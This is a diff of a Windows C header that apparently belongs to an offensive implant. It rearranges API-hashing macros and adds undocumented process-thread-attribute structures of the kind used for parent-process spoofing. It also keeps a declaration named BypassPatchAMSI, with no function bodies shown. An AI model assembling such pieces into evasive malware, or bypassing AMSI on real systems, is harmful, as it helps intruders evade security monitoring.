@@ -15,9 +15,16 @@
 #include <iphlpapi.h>
 #include <lm.h>
 
-typedef PSYSTEM_PROCESS_INFORMATION  PSYS_PROC_INFO;
-typedef SECURITY_QUALITY_OF_SERVICE  SEC_QUALITY_SERVICE;
-typedef OBJECT_ATTRIBUTES            OBJ_ATTR;
+#define HASH_KEY 5381
+#define WIN_FUNC(x) __typeof__(x) * x;
+
+#define DEREF( name )       *( UINT_PTR* ) ( name )
+#define DEREF_32( name )    *( DWORD* )    ( name )
+#define DEREF_16( name )    *( WORD* )     ( name )
+
+#define PIPE_BUFFER_MAX 0x10000 - 1
+#define MAX( a, b ) ( ( a ) > ( b ) ? ( a ) : ( b ) )
+#define MIN( a, b ) ( ( a ) < ( b ) ? ( a ) : ( b ) )
 
 typedef struct
 {
@@ -38,16 +45,43 @@ typedef struct _ANONPIPE
     HANDLE StdOutWrite;
 } ANONPIPE, *PANONPIPE;
 
-#define HASH_KEY 5381
-#define WIN_FUNC(x) __typeof__(x) * x;
+typedef enum _PS_ATTRIBUTE_NUM
+{
+    PsAttributeParentProcess = 0  /*0x0*/,
+    PsAttributeDebugObject   = 1  /*0x1*/,
+    PsAttributeToken         = 2  /*0x2*/,
+    PsAttributeClientId      = 3  /*0x3*/,
+    PsAttributeTebAddress    = 4  /*0x4*/,
+    PsAttributeImageName     = 5  /*0x5*/,
+    PsAttributeImageInfo     = 6  /*0x6*/,
+    PsAttributeMemoryReserve = 7  /*0x7*/,
+    PsAttributePriorityClass = 8  /*0x8*/,
+    PsAttributeErrorMode     = 9  /*0x9*/,
+    PsAttributeStdHandleInfo = 10 /*0xA*/,
+    PsAttributeHandleList    = 11 /*0xB*/,
+    PsAttributeMax           = 12 /*0xC*/
+}PS_ATTRIBUTE_NUM, *PPS_ATTRIBUTE_NUM;
 
-#define DEREF( name )       *( UINT_PTR* ) ( name )
-#define DEREF_32( name )    *( DWORD* )    ( name )
-#define DEREF_16( name )    *( WORD* )     ( name )
+typedef struct _PROC_THREAD_ATTRIBUTE_ENTRY
+{
+    ULONG_PTR  Attribute;
+    ULONG_PTR  Size;
+    ULONG_PTR* pValue;
+    ULONG_PTR  Unknown;
+} PROC_THREAD_ATTRIBUTE_ENTRY, *PPROC_THREAD_ATTRIBUTE_ENTRY;
 
-#define PIPE_BUFFER_MAX 0x10000 - 1
-#define MAX( a, b ) ( ( a ) > ( b ) ? ( a ) : ( b ) )
-#define MIN( a, b ) ( ( a ) < ( b ) ? ( a ) : ( b ) )
+typedef struct _PROC_THREAD_ATTRIBUTE_LIST
+{
+    ULONG_PTR                   Length;
+    PROC_THREAD_ATTRIBUTE_ENTRY Entry;
+} PROC_THREAD_ATTRIBUTE_LIST, *PPROC_THREAD_ATTRIBUTE_LIST;
+
+typedef PSYSTEM_PROCESS_INFORMATION  PSYS_PROC_INFO;
+typedef SECURITY_QUALITY_OF_SERVICE  SEC_QUALITY_SERVICE;
+typedef OBJECT_ATTRIBUTES            OBJ_ATTR;
+typedef OBJECT_ATTRIBUTES            OBJ_ATTR;
+typedef PROC_THREAD_ATTRIBUTE_LIST   THD_ATTR_LIST;
+typedef PROCESS_INFORMATION          PROC_INFO;
 
 DWORD HashStringA(
     IN PCHAR String
@@ -137,11 +171,6 @@ VOID CfgAddressAdd(
 
 BOOL EventSet(
     IN HANDLE Event
-);
-
-BOOL ThreadQueryTib(
-    IN  PVOID   Adr,
-    OUT PNT_TIB Tib
 );
 
 BOOL BypassPatchAMSI(
